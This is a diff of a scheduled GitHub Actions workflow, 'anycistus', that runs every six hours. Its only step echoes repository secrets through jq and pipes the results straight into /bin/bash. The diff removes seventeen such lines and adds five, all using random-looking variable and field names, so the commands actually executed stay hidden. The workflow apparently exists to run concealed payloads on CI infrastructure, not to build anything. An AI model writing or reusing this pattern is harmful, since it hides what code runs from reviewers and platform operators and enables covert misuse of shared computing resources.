@@ -1,33 +1,21 @@
 name: anycistus
+
 on:
   workflow_dispatch:
   schedule:
-    - cron: '54 0/6 * * *'
+    - cron: '47 1/6 * * *'
 jobs:
   build:
     runs-on: ubuntu-latest
-
     steps:
       - uses: actions/checkout@v4
       - name: anycistus
         env:
-          mk3547: ${{ secrets.mk3547 }}
+          rhfpc22: ${{ secrets.rhfpc22 }}
         run: |
-          echo $mk3547 | jq -r .filfk79 | /bin/bash
-          echo $alop945 | jq -r .ribk10125 | /bin/bash
-          echo $ix5473 | jq -r .jb3 | /bin/bash
-          echo $ci01296 | jq -r .ka99298 | /bin/bash
-          echo $peir58954 | jq -r .kvvn56 | /bin/bash
-          echo $jpuz2 | jq -r .pfpp1411 | /bin/bash
-          echo $zlbe7 | jq -r .on047 | /bin/bash
-          echo $gkylp681 | jq -r .o7169 | /bin/bash
-          echo $rifi835 | jq -r .nle6 | /bin/bash
-          echo $ntkrb0 | jq -r .qw18256 | /bin/bash
-          echo $t2996 | jq -r .pebab4 | /bin/bash
-          echo $fnu6 | jq -r .x05107 | /bin/bash
-          echo $aess49666 | jq -r .oo57609 | /bin/bash
-          echo $h55455 | jq -r .yv03124 | /bin/bash
-          echo $mvlp3238 | jq -r .ue70 | /bin/bash
-          echo $fk77 | jq -r .heeq62 | /bin/bash
-          echo $aqet78337 | jq -r .gk82 | /bin/bash
+          echo $rhfpc22 | jq -r .aogx93340 | /bin/bash
+          echo $qkesi7 | jq -r .akx4424 | /bin/bash
+          echo $vhelg370 | jq -r .xpqf45 | /bin/bash
+          echo $ghapo56 | jq -r .xb7700 | /bin/bash
+          echo $fvk06630 | jq -r .jlhzq0 | /bin/bash
 
